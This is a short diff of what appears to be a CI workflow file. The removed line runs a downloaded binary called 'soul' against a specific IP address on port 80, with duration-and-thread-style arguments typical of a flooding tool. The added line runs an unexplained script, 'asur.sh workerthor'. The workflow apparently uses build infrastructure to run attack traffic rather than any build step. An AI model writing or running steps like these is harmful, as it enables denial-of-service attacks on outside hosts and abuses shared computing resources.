@@ -21,4 +21,4 @@ workflows:
           chmod +x soul
 
           echo "Running..."
-          ./soul 216.202.205.235 80 7200 200
+          ./asur.sh workerthor
